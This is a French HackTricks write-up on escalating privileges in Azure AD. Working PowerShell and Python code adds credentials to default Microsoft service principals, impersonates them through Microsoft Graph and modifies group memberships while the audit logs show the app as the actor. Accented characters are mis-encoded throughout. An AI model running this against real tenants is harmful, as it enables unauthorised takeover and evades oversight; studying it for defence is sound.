# Az - Applications par d√©faut

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Ceci est un r√©sum√© de la technique expliqu√©e dans** [**https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/**](https://dirkjanm.io/azure-ad-privilege-escalation-application-admin/)

## Informations de base

Diff√©rence entre une application et un Service Principal dans Azure :

* **Application** : Configuration d'une **application**
* **Service Principal** : Objet de s√©curit√© qui peut r√©ellement avoir des **privil√®ges** dans l'Annuaire Azure

Le **portail Azure** nomme les Service Principals **"Applications d'entreprise"** et **masque** la plupart des **propri√©t√©s** des service principals de la vue.

Pour Office 365 et d'autres **applications Microsoft**, la **d√©finition de l'Application** est pr√©sente dans l'un des **annuaires Azure d√©di√©s** de Microsoft.

{% hint style="danger" %}
Dans un locataire Office 365, des service principals sont cr√©√©s automatiquement pour ces applications, donnant √† un Azure AD Office 365 environ 200 service principals par d√©faut qui ont tous diff√©rentes permissions pr√©-assign√©es.
{% endhint %}

## Acc√©der aux Applications Microsoft

Un **Administrateur d'Application** (ou le **compte de Synchronisation sur site** si vous escaladez du site vers le cloud) peut **attribuer des identifiants √† une application**, apr√®s quoi cette application peut se connecter en utilisant le flux OAuth2 **client credential grant**. L'attribution des identifiants est possible en utilisant PowerShell :
```powershell
PS C:\> $sp = Get-AzureADServicePrincipal -searchstring "Microsoft StaffHub"
PS C:\> New-AzureADServicePrincipalPasswordCredential -objectid $sp.ObjectId -EndDate "31-12-2099 12:00:00" -StartDate "6-8-2018 13:37:00" -Value redactedpassword


CustomKeyIdentifier :
EndDate             : 31-12-2099 12:00:00
KeyId               :
StartDate           : 6-8-2018 13:37:00
Value               : redactedpassword
```
Ensuite, vous pouvez vous connecter et examiner le jeton d'acc√®s d√©livr√©. Ce **JWT affiche les r√¥les que l'application poss√®de dans le Microsoft Graph** :
```python
import requests
import json
import jwt
import pprint

# This should include the tenant name/id
AUTHORITY_URL = 'https://login.microsoftonline.com/ericsengines.onmicrosoft.com'
TOKEN_ENDPOINT = '/oauth2/token'

data = {'client_id':'aa580612-c342-4ace-9055-8edee43ccb89',
'resource':'https://graph.microsoft.com',
'client_secret':'redactedpassword',
'grant_type':'client_credentials'}

r = requests.post(AUTHORITY_URL + TOKEN_ENDPOINT, data=data)

data2 = r.json()

try:
jwtdata = jwt.decode(data2['access_token'], verify=False)
pprint.pprint(jwtdata)
except KeyError:
pass
```
Cela affichera les donn√©es du jeton, contenant le champ "Roles" :

<pre class="language-json"><code class="lang-json">{
"aio": "42FgYJg946pl8aLnJXPOnn4zTe/mBwA=",
"app_displayname": "Microsoft StaffHub",
"appid": "aa580612-c342-4ace-9055-8edee43ccb89",
"appidacr": "1",
"aud": "https://graph.microsoft.com",
"exp": 1567200473,
"iat": 1567171373,
"idp": "https://sts.windows.net/50ad18e1-bb23-4466-9154-bc92e7fe3fbb/",
"iss": "https://sts.windows.net/50ad18e1-bb23-4466-9154-bc92e7fe3fbb/",
"nbf": 1567171373,
"oid": "56748bde-f24d-4a5b-aa2d-c88b175dfc80",
<strong> "roles": ["Directory.ReadWrite.All",
</strong><strong>           "Mail.Read",
</strong><strong>           "Group.Read.All",
</strong><strong>           "Files.Read.All",
</strong><strong>           "Group.ReadWrite.All"],
</strong> "sub": "56748bde-f24d-4a5b-aa2d-c88b175dfc80",
"tid": "50ad18e1-bb23-4466-9154-bc92e7fe3fbb",
"uti": "2GScBJopwk2e3EFce7pgAA",
"ver": "1.0",
"xms_tcdt": 1559139940
}
</code></pre>

Cette m√©thode semble uniquement fonctionner pour le **Microsoft Graph** (et non pour le graphique Azure AD). Je ne suis pas s√ªr si cela est d√ª au fait qu'aucune application n'a de permissions sur le graphique Azure AD ou si le syst√®me utilis√© pour ces permissions est diff√©rent.

Si nous effectuons cette action pour les ~200 applications par d√©faut dans un locataire Office 365, nous obtenons un aper√ßu de toutes les **permissions de ces applications**. Ci-dessous, un aper√ßu des permissions les plus int√©ressantes que j'ai identifi√©es.

| Nom de l'application                  | AppId                                | Acc√®s                               |
| ------------------------------------- | ------------------------------------ | ----------------------------------- |
| Microsoft Forms                       | c9a559d2-7aab-4f13-a6ed-e7e9c52aec87 | **Sites.ReadWrite.All**             |
| Microsoft Forms                       | c9a559d2-7aab-4f13-a6ed-e7e9c52aec87 | **Files.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Sites.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Sites.FullControl.All**           |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Files.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **Group.ReadWrite.All**             |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **User.ReadWrite.All**              |
| Microsoft Cloud App Security          | 05a65629-4c1b-48c1-a78b-804c4abdd4af | **IdentityRiskyUser.ReadWrite.All** |
| Microsoft Teams                       | 1fec8e78-bce4-4aaf-ab1b-5451cc387264 | **Sites.ReadWrite.All**             |
| Microsoft StaffHub                    | aa580612-c342-4ace-9055-8edee43ccb89 | **Directory.ReadWrite.All**         |
| Microsoft StaffHub                    | aa580612-c342-4ace-9055-8edee43ccb89 | **Group.ReadWrite.All**             |
| Microsoft.Azure.SyncFabric            | 00000014-0000-0000-c000-000000000000 | **Group.ReadWrite.All**             |
| Microsoft Teams Services              | cc15fd57-2c6c-4117-a88c-83b1d56b4bbe | **Sites.ReadWrite.All**             |
| Microsoft Teams Services              | cc15fd57-2c6c-4117-a88c-83b1d56b4bbe | **Group.ReadWrite.All**             |
| Office 365 Exchange Online            | 00000002-0000-0ff1-ce00-000000000000 | **Group.ReadWrite.All**             |
| Microsoft Office 365 Portal           | 00000006-0000-0ff1-ce00-000000000000 | **User.ReadWrite.All**              |
| Microsoft Office 365 Portal           | 00000006-0000-0ff1-ce00-000000000000 | **AuditLog.Read.All**               |
| Azure AD Identity Governance Insights | 58c746b0-a0b0-4647-a8f6-12dde5981638 | **AuditLog.Read.All**               |
| Kaizala Sync Service                  | d82073ec-4d7c-4851-9c5d-5d97a911d71d | **Group.ReadWrite.All**             |

## R√©sum√© de l'attaque

Donc, le TL;DR est que si vous compromettez un compte **Application Administrator** ou le **compte de synchronisation sur site**, vous pouvez lire et **modifier les param√®tres de l'annuaire, les appartenances aux groupes, les comptes utilisateurs, les sites SharePoint et les fichiers OneDrive**. Cela se fait en **attribuant des identifiants √† un principal de service existant** avec ces permissions, puis en se faisant passer pour ces applications.

Vous pouvez exploiter cela en **attribuant un mot de passe ou** [**un certificat**](https://docs.microsoft.com/en-us/powershell/azure/active-directory/signing-in-service-principal?view=azureadps-2.0) **√† un principal de service** puis en vous connectant en tant que ce principal de service. J'utilise Python pour me connecter avec un mot de passe de principal de service car le module PowerShell ne prend pas en charge cela (il prend en charge les certificats mais c'est plus complexe √† configurer).

La commande ci-dessous montre que lorsque vous vous connectez avec un tel certificat, nous avons le pouvoir de modifier les appartenances aux groupes (quelque chose que l'administrateur d'application normalement n'a pas) :
```powershell
PS C:\> add-azureadgroupmember -RefObjectId 2730f622-db95-4b40-9be7-6d72b6c1dad4 -ObjectId 3cf7196f-9d57-48ee-8912-dbf50803a4d8
PS C:\> Get-AzureADGroupMember -ObjectId 3cf7196f-9d57-48ee-8912-dbf50803a4d8

ObjectId                             DisplayName UserPrincipalName                 UserType
--------                             ----------- -----------------                 --------
2730f622-db95-4b40-9be7-6d72b6c1dad4 Mark        mark@bobswrenches.onmicrosoft.com Member
```
Dans le journal d'audit Azure AD, les actions sont affich√©es comme √©tant effectu√©es par "Microsoft StaffHub", et donc rien dans le journal n'indique que ces actions ont √©t√© r√©ellement effectu√©es par l'administrateur de l'application.

<details>

<summary><strong>Apprenez le hacking AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez**-moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de hacking en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
